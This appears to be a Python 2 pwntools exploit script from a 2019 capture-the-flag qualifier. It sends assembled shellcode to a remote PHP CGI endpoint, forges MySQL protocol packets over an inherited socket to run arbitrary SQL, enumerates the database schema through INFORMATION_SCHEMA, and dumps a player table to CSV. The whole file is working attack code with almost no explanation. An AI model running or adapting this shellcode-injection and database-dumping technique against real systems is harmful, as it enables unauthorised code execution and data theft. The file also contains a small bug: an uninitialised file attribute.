#!/usr/bin/env python2
from pwn import *
import requests
import re
import string
from pymysql.protocol import MysqlPacket
import unicodedata
import StringIO
import csv
import json

context.arch = "amd64"
context.os = "linux"


class TableDumper:

    def __init__(self, outfile_path=None):
        self.host = "http://shellretql.quals2019.oooverflow.io:9090/"
        self.path = "cgi-bin/index.php"
        self.url = self.host + self.path
        self.html = (
            'X-Powered-By: PHP/7.0.28-0ubuntu0.16.04.1\r\n'
            'Content-Type: text/html; charset=UTF-8\r\n\r\n'
            '<html></html>'
        )
        self.delim = 'scc'
        self.count_q = "select '{delim}',count({col}),'{delim2}' FROM {tbl} {where};"
        self.cell_q = "select '{delim}',{col},'{delim2}' FROM {tbl} {where} LIMIT 1 OFFSET {off};"
        self.encod = 'utf8'
        self.data = None
        self.last_r = None
        self.table_len = 0
        self.file_mode = 'a+'
        self.outfile_path = outfile_path
        self.outfile = None
        self.err_string = 'Error'
        if self.outfile_path:
            self.get_file()
        self.VERBOSE = False
        self.recovered_schema = {}

    def get_file(self):
        if self.file:
            self.file.close()
        self.file = open(self.outfile_path, self.file_mode)

    def write_line(self, line):
        self.file.write(line)

    def build_q(self, q):
        # print q
        shellcode = ""
        shellcode += shellcraft.echo(p16(len(q)) + "\x00\x00\x03" + q, 4)
        shellcode += shellcraft.read(4, 'rsp', 200)
        shellcode += shellcraft.pushstr(self.html)
        shellcode += shellcraft.write(1, 'rsp', 1000)
        self.data = {
            "shell": asm(shellcode) + "\x00"
        }
        return self.data

    def do_request(self):
        # if self.VERBOSE:
        #    print '[+] Query: {}'.format(self.data['shell'])
        self.last_r = requests.post(self.url, data=self.data)
        return self.last_r

    def do_query(self, q):
        self.build_q(q)
        return self.do_request()

    def get_result(self, q):
        res = self.do_query(q)
        # kills unicode bytes
        res = unicodedata.normalize('NFKD', res.text).encode('ascii', 'ignore')
        res = MysqlPacket(res, self.encod).dump()
        try:
            r = res.split(self.delim)[2].split(self.delim[::-1])[0]
        except IndexError:
            print res
            r = 'IndexError :/'
        return r

    def trim(self, s):
        while s.startswith('.'):
            s = s[1:]
        while s.endswith('.'):
            s = s[:-1]
        if '...' in s:
            s = s.split('...')[0]
        return s

    def get_count(self, tbl, col, set_table_len=False, where=None):
        c = self.get_result(self.count_q.format(
            delim=self.delim, col=col, delim2=self.delim[::-1], tbl=tbl, where=where
        ))
        c = int(self.trim(c))
        if set_table_len:
            self.table_len = c
            print '{} number of records in tbl {} {}'.format(c, tbl, where)
        return c

    def get_cell(self, tbl, col, off, where=None):
        q = self.cell_q.format(
            delim=self.delim, col=col, delim2=self.delim[::-1], tbl=tbl, off=off, where=where
        )
        res = self.get_result(q)
        while self.err_string in res:
            res = self.get_result(q)
        return res

    def dump_col(self, tbl, col, where=None):
        self.get_count(tbl, col, set_table_len=True)
        for off in range(self.table_len):
            r = self.get_cell(tbl, col, off, where)
            # print self.trim(r)

    def dump_row(self, tbl, cols, off=0, where=None):
        row = []
        assert(isinstance(row, list))
        for col in cols:
            c = self.get_cell(tbl, col, off, where)
            row.append(self.trim(c))
        return row

    def dump_table(self, tbl, cols, where=None, as_list=False):
        self.get_count(tbl, cols[0], where=where, set_table_len=True)
        ret = []
        for off in range(self.table_len):
            r = self.dump_row(tbl, cols, off, where)
            line = StringIO.StringIO()
            writer = csv.writer(line)
            writer.writerow(r)
            v = line.getvalue().strip()
            print v
            if as_list:
                ret.append(v)
        if ret:
            return ret

    def get_table_names(self):
        tbl = 'INFORMATION_SCHEMA.tables'
        cols = ['table_name']
        table_names = self.dump_table(tbl, cols, as_list=True)
        for tn in table_names:
            self.recovered_schema[tn] = []

    def get_column_names(self):
        for t in self.recovered_schema.keys():
            tbl = 'INFORMATION_SCHEMA.columns'
            cols = ['column_name']
            where = 'where table_name = \'{}\''.format(t)
            column_names = self.dump_table(tbl, cols, where=where, as_list=True)
            if column_names:
                for cn in column_names:
                    self.recovered_schema[t] = self.recovered_schema[t] + [cn, ]
                print t, self.recovered_schema[t]
            else:
                print 'no columns for {}?'.format(t)

    def get_schema(self):
        self.get_table_names()
        self.get_column_names()


def get_cols():
    d = {}
    for tc in SCHEMA:
        t = tc.split('.')[0]
        c = tc.split('.')[1]
        if t in d:
            d[t] = d[t] + [c]
        else:
            d[t] = [c]
    return d


if __name__ == '__main__':
    d = TableDumper()
    tbl = "shellql.Players"
    cols = [
        "_id",
        "Name",
        # "PFRs",
        "VPiPs",
        # "Hands",
        "Notes",
        # "LastPlayed",
        # "StatRecord",
        "StackSize",
        # "Hero",
        "TellNotes",
        "ExploitNotes",
        # "HandRangeNotes",
        "TableNotes",
        "QuickNotes",
        # "ThreeBets",
        # "ThreeBetHands",
        "Location",
        # "Ethnicity",
        # "AgeRange",
        "PFRs_LESS7",
        "VPiPs_LESS7",
        "Hands_LESS7",
        # "Male",
        # "Married",
        # "HatColor",
        # "Hat",
        # "FacialHair",
        # "FacialHairColor",
        # "EyeColor",
        # "Glasses",
        # "HairColor",
        # "HairLength",
        # "IPod",
        # "Rings",
        # "OtherJewelery",
        # "Nickname",
        # "Stakes_Played",
        "Player_Type",
        # "TimesPlayed",
        "Loc_PlayedAt",
        "ContBet",
        "ContBetHands",
        "Net",
        "is_deleted"
    ]
    l = d.dump_table(tbl, cols, as_list=True)
    f = open('data/{}'.format(tbl), 'w+')
    writer = csv.writer(f)
    writer.writerow(cols)
    for line in l:
        f.write(line)
        f.write('\n')
    f.close()
